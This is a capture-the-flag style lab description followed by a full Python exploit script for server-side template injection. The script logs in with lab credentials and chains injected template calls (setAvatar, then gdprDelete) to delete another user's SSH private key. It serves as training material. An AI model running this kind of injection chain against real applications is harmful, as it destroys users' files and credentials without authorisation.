# Server-side template injection with a custom exploit
> This lab is vulnerable to server-side template injection. To solve the lab, create a custom exploit to delete the file `/.ssh/id_rsa` from Carlos's home directory.
> You can log in to your own account using the following credentials: `wiener:peter`
#### Warning
> As with many high-severity vulnerabilities, experimenting with server-side template injection can be dangerous. If you're not careful when invoking methods, it is possible to damage your instance of the lab, which could make it unsolvable. If this happens, you will need to wait 20 minutes until your lab session resets.

```python
import requests
import sys
from bs4 import BeautifulSoup

# --- Configuration ---
# Lab: Server-side template injection with a custom exploit
# GOAL: Chain SSTI with custom PHP methods to delete a protected SSH key.
BASE_URL = "https://0ab20035042e1257803c30f200050092.web-security-academy.net"

def get_csrf_token(session, url):
    """
    Extracts the anti-CSRF token from the given URL.
    """
    response = session.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    return soup.find("input", {"name": "csrf"})['value']
 
def create_authenticated_session(base_url):
    """
    Logs in as 'wiener' and returns the active session.
    """
    login_url = f"{base_url}/login"
    session = requests.Session()
    
    print(f"[*] Authenticating at {login_url}...")
    csrf_token = get_csrf_token(session, login_url)
    
    credentials = {
        "username": "wiener",
        "password": "peter",
        "csrf": csrf_token
    }
    
    response = session.post(login_url, data=credentials)
    if "Log out" in response.text:
        print("[+] Login Successful.")
        return session
    else:
        print("[-] Login Failed.")
        sys.exit(1)

def trigger_template_execution(session, base_url, post_id):
    """
    Visits a blog post to force the template engine to render the author's name.
    This executes the injected payload.
    """
    # Note: We need to visit a post where we have commented, or just the post itself 
    # if the author name is displayed there. 
    # Usually, the 'My Account' page or the 'Blog Post' page renders the name.
    # The instructions imply viewing the comment refreshes the template.
    target = f"{base_url}/post?postId={post_id}"
    print(f"[*] Triggering template execution at: {target}")
    session.get(target)

def exploit_custom_ssti(base_url, session):
    """
    Executes the gadget chain: setAvatar(file) -> gdprDelete().
    """
    # 1. Setup
    account_url = f"{base_url}/my-account"
    change_name_endpoint = f"{base_url}/my-account/change-blog-post-author-display"
    
    # We use Post ID 1 for triggering (assuming it exists)
    TRIGGER_POST_ID = "1" 
    
    # Get CSRF for the account page actions
    csrf_token = get_csrf_token(session, account_url)
    
    # --- STAGE 1: SET TARGET FILE AS AVATAR ---
    # The 'user.setAvatar' method sets the file path.
    # We point it to the SSH key we want to delete.
    # We must provide a MIME type to satisfy the method signature.
    target_file = "/home/carlos/.ssh/id_rsa"
    payload_stage_1 = f"user.setAvatar('{target_file}','image/jpg')"
    
    print(f"[*] STAGE 1: Setting avatar to {target_file}...")
    data_stage_1 = {
        "blog-post-author-display": payload_stage_1,
        "csrf": csrf_token
    }
    session.post(change_name_endpoint, data=data_stage_1)
    
    # TRIGGER 1: Force the setAvatar() call to run
    trigger_template_execution(session, base_url, TRIGGER_POST_ID)
    
    # --- STAGE 2: DELETE THE AVATAR ---
    # Now that the avatar "path" is set to the SSH key,
    # calling gdprDelete() will delete the file at that path.
    payload_stage_2 = "user.gdprDelete()"
    
    # Refresh CSRF (good practice as tokens might rotate)
    csrf_token = get_csrf_token(session, account_url)
    
    print(f"[*] STAGE 2: Invoking gdprDelete()...")
    data_stage_2 = {
        "blog-post-author-display": payload_stage_2,
        "csrf": csrf_token
    }
    session.post(change_name_endpoint, data=data_stage_2)
    
    # TRIGGER 2: Force the gdprDelete() call to run
    trigger_template_execution(session, base_url, TRIGGER_POST_ID)
    
    # --- VERIFICATION ---
    # We check the home page or lab banner
    response = session.get(base_url)
    if "Congratulations" in response.text:
        print("[SUCCESS] Target file deleted. Lab Solved.")
    else:
        print("[*] Exploit chain completed. Check lab banner manually.")

if __name__ == "__main__":
    session = create_authenticated_session(BASE_URL)
    
    # Optional: Post a comment first to ensure our name appears on a blog post
    # This ensures the 'trigger' step actually works.
    # (Simplified for this script, assuming user can comment or name appears in account)
    
    exploit_custom_ssti(BASE_URL, session)
```